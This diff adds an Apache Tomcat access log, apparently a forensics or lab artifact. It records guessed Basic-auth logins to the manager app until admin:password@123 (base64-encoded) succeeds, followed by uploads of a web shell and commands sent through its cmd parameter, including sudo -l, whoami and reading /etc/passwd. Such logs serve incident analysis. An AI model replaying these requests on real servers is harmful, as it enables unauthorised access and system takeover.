@@ -1,0 +1,129 @@
+127.0.0.1 - - [14/Mar/2022:16:48:30 +0000] "GET / HTTP/1.1" 200 11218 -
+127.0.0.1 - - [14/Mar/2022:16:56:23 +0000] "GET /manager HTTP/1.1" 302 - -
+127.0.0.1 - - [14/Mar/2022:16:56:23 +0000] "GET /manager/ HTTP/1.1" 302 - -
+127.0.0.1 - - [14/Mar/2022:16:56:23 +0000] "GET /manager/html HTTP/1.1" 401 2499 -
+127.0.0.1 - - [14/Mar/2022:16:56:33 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic YWRtaW46YWRtaW5AMTIz
+127.0.0.1 - - [14/Mar/2022:16:56:36 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic YWRtaW46dXNlckAxMjM=
+127.0.0.1 - - [14/Mar/2022:16:56:42 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic YWRtaW46cGFzc3dvcmQxMjM=
+127.0.0.1 - - [14/Mar/2022:16:56:50 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic dG9tY2F0OnRvbWNhdEAxMjM=
+127.0.0.1 - - [14/Mar/2022:16:56:52 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic dG9tY2F0Og==
+127.0.0.1 - - [14/Mar/2022:16:56:57 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic dG9tY2F0OnBhc3N3b3JkMTIz
+127.0.0.1 - - [14/Mar/2022:16:57:01 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic YWRtaW46YWRtaW4=
+127.0.0.1 - - [14/Mar/2022:16:57:07 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic dG9tY2F0OnMzY3IzdA==
+127.0.0.1 - admin [14/Mar/2022:16:57:13 +0000] "GET /manager/html HTTP/1.1" 200 22503 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:16:57:13 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:16:57:14 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:16:59:39 +0000] "GET / HTTP/1.1" 200 11218 -
+127.0.0.1 - - [14/Mar/2022:16:59:40 +0000] "GET /tomcat.css HTTP/1.1" 200 5581 -
+127.0.0.1 - - [14/Mar/2022:16:59:40 +0000] "GET /tomcat.png HTTP/1.1" 200 5103 -
+127.0.0.1 - - [14/Mar/2022:16:59:40 +0000] "GET /bg-nav.png HTTP/1.1" 200 1401 -
+127.0.0.1 - - [14/Mar/2022:16:59:40 +0000] "GET /asf-logo-wide.svg HTTP/1.1" 200 27235 -
+127.0.0.1 - - [14/Mar/2022:16:59:40 +0000] "GET /bg-upper.png HTTP/1.1" 200 3103 -
+127.0.0.1 - - [14/Mar/2022:16:59:40 +0000] "GET /bg-button.png HTTP/1.1" 200 713 -
+127.0.0.1 - - [14/Mar/2022:16:59:40 +0000] "GET /bg-middle.png HTTP/1.1" 200 1918 -
+127.0.0.1 - - [14/Mar/2022:16:59:40 +0000] "GET /favicon.ico HTTP/1.1" 200 21630 -
+127.0.0.1 - - [14/Mar/2022:16:59:44 +0000] "GET /manager HTTP/1.1" 302 - -
+127.0.0.1 - - [14/Mar/2022:16:59:44 +0000] "GET /manager/ HTTP/1.1" 302 - -
+127.0.0.1 - - [14/Mar/2022:16:59:44 +0000] "GET /manager/html HTTP/1.1" 401 2499 -
+127.0.0.1 - admin [14/Mar/2022:16:59:52 +0000] "GET /manager/html HTTP/1.1" 200 22503 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:16:59:52 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:16:59:52 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:16:59:52 +0000] "GET /manager/images/asf-logo.svg HTTP/1.1" 200 20486 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:17:00:42 +0000] "GET / HTTP/1.1" 200 11218 -
+127.0.0.1 - - [14/Mar/2022:17:00:43 +0000] "GET /tomcat.css HTTP/1.1" 200 5581 -
+127.0.0.1 - - [14/Mar/2022:17:00:43 +0000] "GET /tomcat.png HTTP/1.1" 200 5103 -
+127.0.0.1 - - [14/Mar/2022:17:00:43 +0000] "GET /favicon.ico HTTP/1.1" 200 21630 -
+127.0.0.1 - - [14/Mar/2022:17:00:43 +0000] "GET /bg-nav.png HTTP/1.1" 200 1401 -
+127.0.0.1 - - [14/Mar/2022:17:00:43 +0000] "GET /asf-logo-wide.svg HTTP/1.1" 200 27235 -
+127.0.0.1 - - [14/Mar/2022:17:00:43 +0000] "GET /bg-upper.png HTTP/1.1" 200 3103 -
+127.0.0.1 - - [14/Mar/2022:17:00:43 +0000] "GET /bg-button.png HTTP/1.1" 200 713 -
+127.0.0.1 - - [14/Mar/2022:17:00:43 +0000] "GET /bg-middle.png HTTP/1.1" 200 1918 -
+127.0.0.1 - - [14/Mar/2022:17:00:54 +0000] "GET /manager/html/ HTTP/1.1" 401 2499 -
+127.0.0.1 - - [14/Mar/2022:17:00:57 +0000] "GET /favicon.ico HTTP/1.1" 200 21630 -
+127.0.0.1 - - [14/Mar/2022:17:01:09 +0000] "GET /manager/html/ HTTP/1.1" 401 2499 -
+127.0.0.1 - admin [14/Mar/2022:17:01:13 +0000] "GET /manager/html/ HTTP/1.1" 200 22503 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:17:01:13 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 -
+127.0.0.1 - - [14/Mar/2022:17:01:13 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 -
+127.0.0.1 - - [14/Mar/2022:17:01:13 +0000] "GET /manager/images/asf-logo.svg HTTP/1.1" 200 20486 -
+127.0.0.1 - - [14/Mar/2022:17:04:46 +0000] "GET /webshell/ HTTP/1.1" 200 120 -
+127.0.0.1 - - [14/Mar/2022:17:04:50 +0000] "GET /webshell/index.jsp?cmd=ls+la HTTP/1.1" 200 120 -
+127.0.0.1 - - [14/Mar/2022:17:04:53 +0000] "GET /webshell/index.jsp?cmd=ls+ HTTP/1.1" 200 328 -
+127.0.0.1 - - [14/Mar/2022:17:04:56 +0000] "GET /webshell/index.jsp?cmd=ls+-la HTTP/1.1" 200 1111 -
+127.0.0.1 - - [14/Mar/2022:17:05:11 +0000] "GET /webshell/index.jsp?cmd=%28cd+webapps%2F+%3B+cat+buffer.txt%29 HTTP/1.1" 200 120 -
+127.0.0.1 - - [14/Mar/2022:17:05:20 +0000] "GET /webshell/index.jsp?cmd=cat+RUNNING.txt HTTP/1.1" 200 18573 -
+127.0.0.1 - - [14/Mar/2022:17:05:32 +0000] "GET /webshell/index.jsp?cmd=ping+8.8.8.8 HTTP/1.1" 200 120 -
+127.0.0.1 - - [14/Mar/2022:17:05:56 +0000] "GET /webshell/index.jsp?cmd=.%2Fas HTTP/1.1" 200 120 -
+127.0.0.1 - - [14/Mar/2022:17:10:02 +0000] "GET /webshell/index.jsp?cmd=uname HTTP/1.1" 200 130 -
+127.0.0.1 - - [14/Mar/2022:17:10:12 +0000] "GET /webshell/index.jsp?cmd=sudo+-l HTTP/1.1" 200 120 -
+127.0.0.1 - - [14/Mar/2022:17:10:21 +0000] "GET /webshell/index.jsp?cmd=pwd HTTP/1.1" 200 142 -
+127.0.0.1 - - [14/Mar/2022:17:10:32 +0000] "GET /webshell/index.jsp?cmd=cat+%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1118 -
+127.0.0.1 - - [14/Mar/2022:17:11:37 +0000] "GET /webshell/index.jsp?cmd=cat+%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1118 -
+127.0.0.1 - - [14/Mar/2022:17:13:05 +0000] "GET / HTTP/1.1" 200 11218 -
+127.0.0.1 - - [14/Mar/2022:17:13:05 +0000] "GET /tomcat.css HTTP/1.1" 200 5581 -
+127.0.0.1 - - [14/Mar/2022:17:13:05 +0000] "GET /tomcat.png HTTP/1.1" 200 5103 -
+127.0.0.1 - - [14/Mar/2022:17:13:05 +0000] "GET /favicon.ico HTTP/1.1" 200 21630 -
+127.0.0.1 - - [14/Mar/2022:17:13:05 +0000] "GET /bg-nav.png HTTP/1.1" 200 1401 -
+127.0.0.1 - - [14/Mar/2022:17:13:05 +0000] "GET /asf-logo-wide.svg HTTP/1.1" 200 27235 -
+127.0.0.1 - - [14/Mar/2022:17:13:06 +0000] "GET /bg-upper.png HTTP/1.1" 200 3103 -
+127.0.0.1 - - [14/Mar/2022:17:13:06 +0000] "GET /bg-button.png HTTP/1.1" 200 713 -
+127.0.0.1 - - [14/Mar/2022:17:13:06 +0000] "GET /bg-middle.png HTTP/1.1" 200 1918 -
+127.0.0.1 - - [14/Mar/2022:17:13:10 +0000] "GET /manager HTTP/1.1" 302 - -
+127.0.0.1 - - [14/Mar/2022:17:13:10 +0000] "GET /manager/ HTTP/1.1" 302 - -
+127.0.0.1 - - [14/Mar/2022:17:13:10 +0000] "GET /manager/html HTTP/1.1" 401 2499 -
+127.0.0.1 - - [14/Mar/2022:17:13:14 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic YWRtaW46YWRtaW4yPUAxMjM=
+127.0.0.1 - - [14/Mar/2022:17:13:17 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic YWRtaW46YWRtaW4=
+127.0.0.1 - - [14/Mar/2022:17:13:21 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic dG9tY2F0OnRvbWNhdA==
+127.0.0.1 - - [14/Mar/2022:17:13:24 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic dG9tY2F0Og==
+127.0.0.1 - - [14/Mar/2022:17:13:26 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic YWRtaW46
+127.0.0.1 - - [14/Mar/2022:17:13:34 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic dG9tY2F0OnBhc3N3b3JkQDEyMw==
+127.0.0.1 - - [14/Mar/2022:17:13:39 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic YWRtaW46MTIzNDU2
+127.0.0.1 - - [14/Mar/2022:17:13:45 +0000] "GET /manager/html HTTP/1.1" 401 2499 Basic dG9tY2F0OjEyMzQ1Ng==
+127.0.0.1 - admin [14/Mar/2022:17:13:50 +0000] "GET /manager/html HTTP/1.1" 200 22503 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:17:13:50 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:17:13:50 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:17:13:50 +0000] "GET /manager/images/asf-logo.svg HTTP/1.1" 200 20486 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:15:49 +0000] "POST /manager/html/undeploy;jsessionid=2BC01F03C737ED11E89BFC190455F78F?path=/webshell&org.apache.catalina.filters.CSRF_NONCE=E18845238C7FB7F036B9E4B2AD4A4C1A HTTP/1.1" 200 18886 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:15:49 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:15:49 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:15:52 +0000] "POST /manager/html/undeploy?path=/cmd&org.apache.catalina.filters.CSRF_NONCE=D2347690CA64CAC570A11C316A36E83D HTTP/1.1" 200 17090 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:15:52 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:15:52 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:15:58 +0000] "POST /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=EA2DC41DFBB9C5674CFAED9A5F029BA4 HTTP/1.1" 200 18849 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:15:58 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:15:58 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:17:16:01 +0000] "GET /cmd(1)/ HTTP/1.1" 404 763 -
+127.0.0.1 - admin [14/Mar/2022:17:38:29 +0000] "POST /manager/html/undeploy?path=/cmd(1)&org.apache.catalina.filters.CSRF_NONCE=5E2B0E820A27FAA58CD70B351FC250ED HTTP/1.1" 200 17093 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:30 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:30 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:40 +0000] "POST /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=C69B30619C03996AFE809DE1CD230D24 HTTP/1.1" 200 18863 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:40 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:40 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:48 +0000] "POST /manager/html/reload?path=/webshell&org.apache.catalina.filters.CSRF_NONCE=831398F6E5E940CFA248DAC0FE975B5C HTTP/1.1" 200 18919 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:48 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:48 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:54 +0000] "POST /manager/html/stop?path=/webshell&org.apache.catalina.filters.CSRF_NONCE=26E26E35EFF2BC417C3DA940EAF4AEAB HTTP/1.1" 200 18329 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:54 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:54 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:58 +0000] "POST /manager/html/start?path=/webshell&org.apache.catalina.filters.CSRF_NONCE=EE30B0A9A7B8E87027B39EB78C99A72F HTTP/1.1" 200 18918 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:58 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:17:38:58 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:38 +0000] "POST /manager/html/undeploy?path=/webshell&org.apache.catalina.filters.CSRF_NONCE=CD9F763802BF2D93EC8A2D53B781B875 HTTP/1.1" 403 3446 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:18:24:42 +0000] "GET /manager HTTP/1.1" 302 - -
+127.0.0.1 - - [14/Mar/2022:18:24:42 +0000] "GET /manager/ HTTP/1.1" 302 - Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:42 +0000] "GET /manager/html HTTP/1.1" 200 18863 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:18:24:42 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:18:24:42 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:45 +0000] "POST /manager/html/undeploy?path=/webshell&org.apache.catalina.filters.CSRF_NONCE=8EA4422480A21DD56F09136E2FA9D219 HTTP/1.1" 200 17095 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:45 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:45 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:49 +0000] "POST /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=224B27B11E0272063918190E457E8629 HTTP/1.1" 200 18828 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:49 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:49 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:55 +0000] "POST /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=679F393E604EE3C8631E39BEAAE1978A HTTP/1.1" 200 20641 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:55 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:24:55 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:26:19 +0000] "POST /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=42DD3EDFE7C209A43569D1516E55A13A HTTP/1.1" 200 22467 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:26:19 +0000] "GET /manager/css/manager.css HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - admin [14/Mar/2022:18:26:19 +0000] "GET /manager/images/tomcat.svg HTTP/1.1" 404 1524 Basic YWRtaW46cGFzc3dvcmRAMTIz
+127.0.0.1 - - [14/Mar/2022:18:26:23 +0000] "GET /webshell/ HTTP/1.1" 200 120 -
+127.0.0.1 - - [14/Mar/2022:18:26:28 +0000] "GET /webshell/index.jsp?cmd=whoami HTTP/1.1" 200 129 -
